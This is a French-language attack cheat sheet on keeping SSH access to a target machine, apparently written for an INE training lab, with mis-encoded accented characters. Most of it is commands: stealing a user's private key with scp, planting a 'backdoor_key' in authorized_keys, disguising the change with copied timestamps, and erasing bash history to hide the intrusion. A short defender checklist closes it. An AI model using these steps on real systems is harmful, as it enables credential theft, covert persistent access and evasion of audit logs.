# Cheatsheet - Persistance SSH avec ClÃ©s

## ğŸ¯ Objectif
Maintenir l'accÃ¨s Ã  une machine cible en utilisant les clÃ©s SSH mÃªme aprÃ¨s modification des identifiants.

## ğŸ“‹ PrÃ©requis
- AccÃ¨s initial avec identifiants (username/password)
- Service SSH actif sur la cible
- Permissions de lecture sur le rÃ©pertoire `.ssh`

## ğŸ” Phase de Reconnaissance

### VÃ©rifier la connectivitÃ©
```bash
ping -c 4 <target>
```

### Scanner les ports SSH
```bash
nmap <target>
nmap -p 22 <target>
```

## ğŸ” Phase d'AccÃ¨s Initial

### Connexion SSH standard
```bash
ssh <username>@<target>
# Entrer le mot de passe
```

### Ã‰numÃ©ration du rÃ©pertoire home
```bash
ls -al ~/
ls -al ~/.ssh/
```

**Fichiers clÃ©s Ã  rechercher :**
- `id_rsa` - ClÃ© privÃ©e
- `id_rsa.pub` - ClÃ© publique  
- `authorized_keys` - ClÃ©s autorisÃ©es
- `known_hosts` - Hosts connus

## ğŸ’¾ Phase de RÃ©cupÃ©ration des ClÃ©s

### Copier la clÃ© privÃ©e vers l'attaquant
```bash
# MÃ©thode 1: SCP
scp <username>@<target>:~/.ssh/id_rsa ./id_rsa_target

# MÃ©thode 2: Affichage et copie manuelle
cat ~/.ssh/id_rsa
```

### SÃ©curiser la clÃ© privÃ©e
```bash
chmod 400 id_rsa_target
```

## ğŸš€ Phase de Persistance

### Connexion avec clÃ© privÃ©e
```bash
ssh -i id_rsa_target <username>@<target>
```

### Options SSH utiles
```bash
# Ignorer la vÃ©rification de l'host
ssh -i id_rsa_target -o StrictHostKeyChecking=no <username>@<target>

# Connexion silencieuse
ssh -i id_rsa_target -o LogLevel=QUIET <username>@<target>

# SpÃ©cifier le port
ssh -i id_rsa_target -p 2222 <username>@<target>
```

## ğŸ›¡ï¸ Techniques AvancÃ©es de Persistance

### CrÃ©er une nouvelle paire de clÃ©s
```bash
# Sur la machine attaquante
ssh-keygen -t rsa -b 4096 -f ./backdoor_key

# Ajouter la clÃ© publique aux authorized_keys de la cible
cat backdoor_key.pub >> ~/.ssh/authorized_keys
```

### Modifier les permissions
```bash
chmod 700 ~/.ssh/
chmod 600 ~/.ssh/authorized_keys
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
```

### Masquer la persistance
```bash
# Modifier les timestamps
touch -r /etc/passwd ~/.ssh/authorized_keys

# Ajouter la clÃ© dans un fichier existant
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

## ğŸ§¹ Nettoyage des Traces

### Supprimer les logs de connexion
```bash
# Vider les logs
> ~/.bash_history
history -c

# Supprimer des lignes spÃ©cifiques
sed -i '/ssh/d' ~/.bash_history
```

### Nettoyer les fichiers temporaires
```bash
rm -f ~/wait
rm -f /tmp/ssh-*
```

## âš ï¸ Points d'Attention

### VÃ©rifications de sÃ©curitÃ©
- **Permissions des fichiers SSH** : Respecter les permissions strictes
- **SELinux/AppArmor** : Peut bloquer certaines opÃ©rations
- **Surveillance** : Les connexions SSH sont souvent loggÃ©es

### Erreurs communes
```bash
# âŒ Permissions incorrectes
chmod 777 id_rsa  # DANGER!

# âœ… Permissions correctes
chmod 400 id_rsa  # Lecture seule pour le propriÃ©taire
```

## ğŸ”§ DÃ©pannage

### ProblÃ¨mes de connexion
```bash
# Mode debug
ssh -v -i id_rsa_target <username>@<target>

# VÃ©rifier les permissions
ls -la ~/.ssh/

# Tester la clÃ©
ssh-keygen -l -f id_rsa_target
```

### Messages d'erreur courants
- `Permission denied (publickey)` â†’ VÃ©rifier permissions et chemin
- `Bad permissions` â†’ Corriger avec chmod 400
- `Host key verification failed` â†’ Utiliser -o StrictHostKeyChecking=no

## ğŸ“ Exemple Complet

```bash
# 1. Reconnaissance
nmap -p 22 demo.ine.local

# 2. AccÃ¨s initial
ssh student@demo.ine.local
# Password: password

# 3. Ã‰numÃ©ration
ls -al ~/.ssh/

# 4. Exfiltration de clÃ©
exit
scp student@demo.ine.local:~/.ssh/id_rsa ./stolen_key

# 5. SÃ©curisation
chmod 400 stolen_key

# 6. Persistance
ssh -i stolen_key student@demo.ine.local

# 7. RÃ©cupÃ©ration du flag
cat flag.txt
```

## ğŸ›¡ï¸ Contre-mesures

### Pour les dÃ©fenseurs
- Rotation rÃ©guliÃ¨re des clÃ©s SSH
- Surveillance des connexions par clÃ©s
- DÃ©sactiver l'authentification par mot de passe
- Utiliser des certificats SSH plutÃ´t que des clÃ©s statiques
- Monitoring des modifications dans ~/.ssh/

---
*âš¡ Cette technique exploite la persistance des clÃ©s SSH aprÃ¨s modification des mots de passe.*